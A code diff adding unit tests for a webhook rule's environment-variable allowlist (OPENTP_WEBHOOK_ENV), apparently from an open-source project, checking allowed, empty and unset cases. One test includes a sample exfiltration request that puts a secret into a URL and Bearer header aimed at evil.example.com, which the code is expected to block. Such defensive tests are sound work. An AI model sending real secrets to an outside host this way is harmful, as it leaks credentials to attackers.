@@ -189,6 +189,69 @@ describe("webhook rule", () => {
     delete process.env.TEST_API_KEY;
   });
 
+  describe("OPENTP_WEBHOOK_ENV", () => {
+    afterEach(() => {
+      delete process.env.OPENTP_WEBHOOK_ENV;
+      delete process.env.TEST_ALLOWED;
+      delete process.env.TEST_SECRET;
+    });
+
+    it("reads only the listed variables and sends nothing when another one is used", async () => {
+      process.env.OPENTP_WEBHOOK_ENV = "TEST_ALLOWED, OTHER";
+      process.env.TEST_ALLOWED = "ok";
+      process.env.TEST_SECRET = "do-not-send";
+      vi.mocked(fetch).mockResolvedValue({ ok: true, status: 200 } as Response);
+
+      const allowed = await webhook.validate(
+        "value",
+        { url: `https://api.example.com/\${TEST_ALLOWED}` },
+        ctx,
+      );
+      expect(allowed.valid).toBe(true);
+      expect(fetch).toHaveBeenCalledWith("https://api.example.com/ok", expect.any(Object));
+
+      vi.mocked(fetch).mockClear();
+      const denied = await webhook.validate(
+        "value",
+        {
+          url: `https://evil.example.com/?k=\${TEST_SECRET}`,
+          headers: { Authorization: `Bearer \${TEST_SECRET}` },
+        },
+        ctx,
+      );
+      expect(denied).toMatchObject({ valid: false, code: "WEBHOOK_ENV_NOT_ALLOWED" });
+      expect(denied.error).toContain("TEST_SECRET");
+      expect(fetch).not.toHaveBeenCalled();
+    });
+
+    it("allows no variable when it is set but empty", async () => {
+      process.env.OPENTP_WEBHOOK_ENV = "";
+      process.env.TEST_SECRET = "do-not-send";
+      const result = await webhook.validate(
+        "value",
+        { url: `https://api.example.com/\${TEST_SECRET}` },
+        ctx,
+      );
+      expect(result.code).toBe("WEBHOOK_ENV_NOT_ALLOWED");
+      expect(fetch).not.toHaveBeenCalled();
+    });
+
+    it("keeps interpolating when it is not set, with one warning per variable", async () => {
+      process.env.TEST_SECRET = "value-1";
+      const warn = vi.spyOn(console, "error").mockImplementation(() => {});
+      vi.mocked(fetch).mockResolvedValue({ ok: true, status: 200 } as Response);
+      for (let i = 0; i < 2; i++) {
+        await webhook.validate("value", { url: `https://api.example.com/\${TEST_SECRET}` }, ctx);
+      }
+      expect(fetch).toHaveBeenCalledWith("https://api.example.com/value-1", expect.any(Object));
+      const warnings = warn.mock.calls.filter((call) =>
+        String(call[0]).includes("OPENTP_WEBHOOK_ENV"),
+      );
+      expect(warnings).toHaveLength(1);
+      expect(String(warnings[0]?.[0])).toContain('variable="TEST_SECRET"');
+    });
+  });
+
   it("should handle timeout", async () => {
     vi.mocked(fetch).mockImplementationOnce(() => {
       const error = new Error("Aborted");
